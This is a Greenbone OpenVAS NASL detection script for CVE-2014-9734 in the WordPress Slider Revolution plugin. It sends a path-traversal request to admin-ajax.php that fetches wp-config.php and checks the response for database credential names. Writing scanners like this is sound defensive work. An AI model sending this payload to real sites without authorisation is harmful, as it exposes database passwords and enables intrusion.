###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_slider_revolution_file_download_vuln.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# Wordpress Revslider Arbitrary File Download Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805670");
  script_version("$Revision: 14117 $");
  script_cve_id("CVE-2014-9734");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-07-10 15:54:40 +0530 (Fri, 10 Jul 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress Revslider Arbitrary File Download Vulnerability");

  script_tag(name:"summary", value:"This host is installed with wordpress slider
  revolution plugin and is prone to arbitrary file download vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to download an arbitrary file.");

  script_tag(name:"insight", value:"The flaw is due to an improper input
  sanitization  of the img parameter in a revslider_show_image action to
  'wp-admin/admin-ajax.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to arbitrary files and to compromise
  the application.");

  script_tag(name:"affected", value:"Wordpress Slider Revolution (revslider)
  plugin before 4.2.");

  script_tag(name:"solution", value:"Upgrade to Wordpress Slider Revolution 4.2 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/132366/");
  script_xref(name:"URL", value:"http://marketblog.envato.com/news/plugin-vulnerability/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://revolution.themepunch.com/");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"(DB_USER|DB_PASSWORD|DB_NAME)"))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
